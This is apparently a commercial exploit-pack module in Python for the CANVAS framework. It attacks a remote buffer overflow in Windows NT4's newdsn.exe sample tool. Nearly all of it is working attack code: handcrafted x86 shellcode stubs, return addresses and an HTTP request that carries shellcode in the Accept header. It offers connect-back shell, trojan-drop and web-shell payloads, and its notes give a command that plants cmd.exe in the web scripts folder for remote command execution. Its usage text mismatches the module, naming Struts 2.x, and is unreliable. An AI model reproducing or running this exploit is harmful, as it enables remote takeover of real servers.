
#! /usr/bin/env python
######################################################################################
# White Phosphorus Exploit Pack
#
# Proprietary source code - use only under the license agreement in distribution
#
######################################################################################


#Standard Imports
import sys 
sys.path.append(".")
sys.path.append("3rdparty/White_Phosphorus/libs")

import os
import socket
import sys
import time
from struct import *

# CANVAS modules
from wp_exploit import *
from wp_dialog import *
from wp_osversions import *
import canvasengine
from MOSDEF import mosdef 
from MOSDEF.mosdefutils import *
from MOSDEFShellServer import MosdefShellServer

from shelllistener import shelllistener
from shelllistener import *
from unixShellNode import unixShellNode
from libs.ctelnetlib import Telnet

from libs import spkproxy
import urllib

######################################################################################
NAME = "Microsoft Windows NT4 DSN Remote Overflow"
DESCRIPTION = "Exploits an overflow in one of the samples tools installed with NT4.0."
VERSION = "1.0"
DOCUMENTATION = {}
DOCUMENTATION['VENDOR']='Microsoft'
DOCUMENTATION["Date public"] = ""
DOCUMENTATION["Repeatability"] = "Unlimited"
DOCUMENTATION['CVE'] = ""
DOCUMENTATION['CVE Url'] = ''
DOCUMENTATION["References"] = ""
DOCUMENTATION["Notes"] = """
This will work against a fully patched NT4.0 box, and as there are no more security releases this is classed as an unpatchable vulnerability.

cmd /c copy %comspec% c:\inetpub\scripts\wp.exe  will copy cmd.exe to c:\inetpub\scripts\wp.exe

This can then be used to execute further commands using /scripts/wp.exe?/c+dir
"""

# Targets
PROPERTY = {}
PROPERTY['TYPE'] = "Exploit"
PROPERTY['SITE'] = "Remote"
PROPERTY['ARCH'] = [ ["Windows"] ]
PROPERTY['VERSION'] = [ "Windows NT" ]


NOTES="""
WP> White Phosphorus Exploit Pack
---------------------------------------------------------------
Usage:
-T (check if target is vulnerable)
-v <version to target>
-t <target ip>   -p <target port>
-l <callback ip>

Payload Options:
-O path:<path#>  (path to the action)
-O payload:<#>   (will use default if not specified)
-O command:<cmd> (for Execute Command payload)
-O dataport:<#>  (port used for data connections)

Versions:
0: Struts 2.x

Payloads:
0: Execute Command (blind)
1: Execute Command (nc pipe)
2: TCP Connect Back (nc -e)
3: TCP Connect Back Drop Trojan
4: Create Web Shell
    
Example:
./3rdparty/White_Phosphorus/exploits/wp_nt4_dsn/wp_nt4_dsn  -v0 -t 10.1.1.10 -l 10.1.1.1  -O payload:0
"""

PORT = 80
######################################################################################

# Dialog Hooks
def dialog_update(gtk, wt):
    wp_dialog_update(gtk, wt, theexploit, targets, PORT)
    return

targets = {
    0 : ["Windows NT4.0 Default", (0x00000000, 0x00000000, 0x0000), []],
    1 : ["Windows NT4.0 Access 2000", (0x00000000, 0x00000000, 0x0000), []]
}

class theexploit(wp_exploit):
    ######################################################################################
    ## WP> Dialog Information
    ##########################s############################################################
    PAYLOADS=["TCP Connect Back",
              "Execute Command"]

    DEFAULT_PAYLOAD = 1

    def __init__(self):
        tcpexploit.__init__(self)
        self.host = "127.0.0.1"
        self.port = PORT
        self.targets = targets
        self.version = 0
        self.badstring = "\x00\x0a\x0d" 
        self.setInfo(DESCRIPTION)
        self.setInfo(VERSION)
        self.name = NAME
        self.use_universal=True
        self.encode_printable=False
        self.alignstack = True
        self.autoVersioned = False
        self.headers = []
        self.basepath = "/scripts/tools/newdsn.exe"
       
        return

    def usage(self):
        self.wp_usage(targets)
        return  
    
    def test(self):
        self.host=self.target.interface
        self.port=int(self.argsDict.get("port",self.port))
        return wp_isPortOpen(self, self.host,self.port)

    def neededListenerTypes(self):
        self.getArgs()
        return self.wp_createWin32Listener()

    def createShellcode(self):
        self.getArgs()

        self.log('WP> Targeting version %d: %s'%(self.version,targets[self.version][0]))
        return self.wp_createShellcode()  

    def getArgs(self):
           
        # Command line options
        
        if self.argsDict.has_key("path"):
            p = self.argsDict["path"]
            self.basepath = p
            
        if self.argsDict.has_key("cookies"):
            self.headers.append(("Cookie",self.argsDict["cookies"]))
       
        self.host=self.target.interface
        self.port=int(self.argsDict.get("port",self.port))
              
        if self.argsDict.get("hostname", False):
            self.hostname = self.argsDict["hostname"]
        else: 
            self.hostname = "%s:%d" % (self.argsDict.get("hostname", self.target.interface), self.port)
        self.headers.append(("Host", self.hostname))
        self.ssl = self.argsDict.get("ssl", False)
        
        self.url = "http%s://%s:%d%s?"%(self.ssl and "s" or "", self.host, self.port, self.basepath)
        
        # Selected shell options
        self.wp_getShellcodeType()
                
        return

    def displayVersions(self):
        for t in targets.keys():
            print 'WP> Version %d: %s'%(t,targets[t][0])
        return
        
    def makesploit(self):
        if self.version == 0:
            payload = "driver=Microsoft%2BAccess%2BDriver%2B%28*.mdb%29&dsn=\xEB\x62snewdb=Cdbq=c:\webs17.mdbattr="
            payload += pack('<L', 0x7ffdf210) *17    # Write space in PEB and RET
            
            stubcode  ="\x90"
            stubcode += "\x68\xFF\xFB\xFF\xFF"  # push -401
            stubcode += "\xF7\x1C\x24" # Neg [ESP]
            stubcode += "\x68\xB0\xF2\xFD\x7F"  # Push 0x7FFDF2B0
            stubcode += "\x68\x9E\xF2\xFD\x7F"  # Push 0x7FFdF2A0
            stubcode += "\xB8\xF4\xDF\xFF\xFE" # Mov EAX, 0xFEFFDFF4
            stubcode += "\xF7\xD8"  # neg eax
            stubcode += "\x80\x2D\xA9\xF2\xFD\x7F\x01" # sub x,1
            stubcode += "\xFF\x10"  # CAll [EAX]
            stubcode += "\xEB\x17"  #Jmp ..
            stubcode += wp_randomstring(5,self.badstring)
            stubcode += "HTTP_ACCEPT\x01"
            
            payload += stubcode
            payload += wp_randomstring((677 -len(stubcode)),self.badstring)    
            
            # Shellcode
            self.headers.append(("ACCEPT", self.shellcode))
        else:
            payload = "driver=Microsoft%2BAccess%2BDriver%2B%28*.mdb%29&newdb=C&dbq=c:\webs.mdb&attr=&dsn="
            unicode= "\x54\x6e\x58\x6e"  # Push ESP, Pop EAX
            unicode += "\xC6\x33\x6e\x40\x6e"  # Xor EBX,EBX \x33\xdb
            unicode += "\xC6\xdb\x6e\x40\x6e"  # 
            unicode += "\xC6\x66\x6e\x40\x6e"  # Add BX,3d7a \x66\x81\xc3\x20\x3d
            unicode += "\xC6\x81\x6e\x40\x6e"  #
            unicode += "\xC6\xc3\x6e\x40\x6e"  #
            unicode += "\xC6\x7a\x6e\x40\x6e"  #
            unicode += "\xC6\x3d\x6e\x40\x6e"  #
            unicode += "\xC6\x03\x6e\x40\x6e"  # Add ESP,EBX \x03\xe3
            unicode += "\xC6\xe3\x6e\x40\x6e"  #
            unicode += "\xC6\xff\x6e\x40\x6e"  # JMP ESP \xff\xe4
            unicode += "\xC6\xe4\x6e\x40\x6e"  #
            unicode += "\x54\x6e\xC3"          # Push ESP, RET
            
            payload += unicode + wp_randomstring((82-len(unicode))) 
            payload += "\x98\x02"  # Ret Address
            
            payload += wp_randomstring(4) #
            payload += "\x98\x02" # Write address 0x000202dc

            stubcode  ="\x90"
            stubcode += "\x54\x5b"  # push esp / pop ebx
            stubcode += "\x68\xFF\xFB\xFF\xFF"  # push -401
            stubcode += "\xF7\x1C\x24" # Neg [ESP]
            stubcode += "\xbf\x24\xfd\xFD\xfF"  # mov edi,0xfffdfd24
            stubcode += "\xf7\xdf"  # neg edi
            stubcode += "\x57"  # push edi
            stubcode += "\x83\xc3\x2d"  # add ebx,2d
            stubcode += "\x53"  # push ebx
            stubcode += "\xB8\xF4\xDF\xFF\xFE" # Mov EAX, 0xFEFFDFF4
            stubcode += "\xF7\xD8"  # neg eax
            stubcode += "\xfe\x4b\x0b" # dec byte ptr x
            stubcode += "\xFF\x10"  # CAll [EAX]
            stubcode += "\xff\xe7"  #Jmp edi
            stubcode += "\xCC" * 5
            stubcode += "HTTP_ACCEPT\x01"

            payload += "\x90\x90\x90" + stubcode
            payload += wp_randomstring(677 -len(stubcode))
            
            # Shellcode
            self.headers.append(("ACCEPT", "\x90" + self.shellcode))
                               
        return payload

    def run(self):
    
        self.getArgs()
        
        payload = self.makesploit()
       
        self.log("WP> Attacking http://%s:%d%s"%(self.host, self.port, self.basepath))
                
        response = spkproxy.urlopen(self.url + payload, extraheaders=self.headers, data="", exploit=self)
        buffer = response.read()
        self.log("WP> %s "%buffer)

        time.sleep(5)

        ret=self.ISucceeded()
        self.setInfo("WP> %s attacking %s:%d - completed"%(NAME,self.host,self.port))
        return ret
        
      
if __name__== '__main__':
    print 'WP> Running White Phosphorus %s Exploit v %s'%(NAME,VERSION)
    app = theexploit()
    ret=standard_callback_commandline(app)
    if ret not in [0,1,None]:
        ret.interact()
